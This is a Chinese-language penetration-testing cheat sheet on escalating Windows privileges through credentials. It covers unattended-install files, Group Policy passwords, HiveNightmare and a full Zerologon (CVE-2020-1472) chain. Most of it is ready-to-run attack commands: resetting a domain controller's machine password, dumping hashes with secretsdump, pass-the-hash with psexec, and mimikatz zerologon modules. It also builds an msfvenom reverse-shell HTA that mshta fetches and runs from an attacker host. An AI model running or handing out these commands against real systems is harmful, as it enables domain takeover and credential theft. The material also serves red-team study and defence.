# 利用用户凭据提权

#### 枚举Unattended凭据

原理：无人值守安装Unattended允许应用程序在不需要管理员关注下自动安装，无人值守安装会在系统中残留一些配置问题,可以通过枚举上述配置文件检索一些关键字获取管理员权限

```
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\windows\System32\sysprep.inf
c:\windows\System32\sysprep\sysprep.xml
c:\unattend.xml
c:\windows\Panther\Unattend.xml
c:\windows\Panther\Unattended.xml
c:\windows\Panther\Unattend\Unattended.xml
c:\windows\Panther\Unattend\Unattend.xml
c:\windows\System32\Sysprep\unattend.xml
c:\windows\System32\Sysprep\Panther\unattend.xml
```

#### 枚举组策略凭据

支持系统：Windows Server 2008以上系统 原理：在新建一个组策略后，域控制器会自动在SYSVOL共享目录生成一个XML文件，该文件名为Groups.XML， 保存了组策略更新后的密码，在2012年微软公开了该文件AES 256算法加密的私钥

```
msf6 : post/windows/gather/credentials/gpp
```

#### HiveNightmare

原理：自Windows 10 version 1809以来全部版本包括Windows11，由于ACL管理宽松，导致任何标准用户都可以从系统卷影响副本中读取包括SAM、SYSTEM、SECURITY在内的多个系统文件

检测Poc，判断是否可以以标准用户执行以下命令。若输出BUILTIN\Users:(I)(RX)，则存在漏洞

```
icacls C:\Windows\System32\config\SAM
```

利用：

https://github.com/GossiTheDog/HiveNightmare/raw/master/Release/HiveNightmare.exe

导出后的三个文件可以用`Impacket Secretsdump.py`导出用户Hash

```
python3 secretsdump.py -sam SAM-xxx -system SYSTEM-xxxx -security SECURITY-xxxxx
```

#### Zerologon域内提权(CVE-2020-1472)

原理：Netlogon远程协议的一个特权提升漏洞，可以在不提供任何凭据的情况下通过身份验证，并实现域内提权，常见的利用方式是调用`Netlogon`中的RPC函数`NetrServerPasswordSet2`来重置域控密码。注意重置的是域控机器账户的密码，该密码由系统随机组成

重置密码导致域控脱域原因：域控`NTDS.dit`中存储的密码和域控本地注册表中存储的密码不一致

攻击流程：`执行poc将域控制器机器密码重置为空->利用脚本空密码连接上域控并导出SAM—>哈希传递攻击，获取系统SYSTEM权限->恢复域控密码`

* 执行poc将域控制器机器密码重置为空

```
python3 cve-2020-1472-exploit.py DC-1 10.10.10.11
```

* `impacket secretsdump`密码连接上域控并导出SAM(域名\主机名$@ip地址)

```
python3 secretsdump.py hack-my.com/DC-1\$@10.10.10.11 -just-dc-user "hack-my\administrator" -no-pass
```

* `impacket`哈希传递攻击

```
python3 psexec.py hack-my.com/administrator@10.10.10.11 -hashes xxx:xxxx
```

* `cmd`远程加载`hta`上线`meterpreter`

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.10.26 lport=9876 -f hta-psh -o 111.hta
python3 -m http.server
mshta http://10.10.10.26:8000/111.hta
```

* 恢复域控密码：导出HKLM\SYTEM、HKLM\SAM、HKLM\SECURITY 册表

```
reg save HKLM\SYSTEM system-re.save
reg save HKLM\SAM sam-re.save
reg save HKLM\SECURITY security-re.save 
```

* `secretsdump`导出重置前的机器密码

```
python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL ($MACHINE.ACC:plain_password_hex)
```

* cve-2020-1472-exploit restorrepassword.py恢复域控机器密

```
python3 restorrepassword.py hack-my.com/DC-1@DC-1 -target-ip 10.10.10.11 -hexpass xxxxxxx
```

攻击流程2(mimikatz)：

* mimikatz lsadump::zerologon模块重置密码

```
mimikatz.exe "lsadump::zerologon /target:10.10.10.11 /ntlm /null /account:DC-1$ /exploit" exit
```

mimikatz postzerologon恢复域控密码

```
mimikatz.exe "lsadump::postzerologon /target:10.10.10.11 /account:DC-1$" 
```
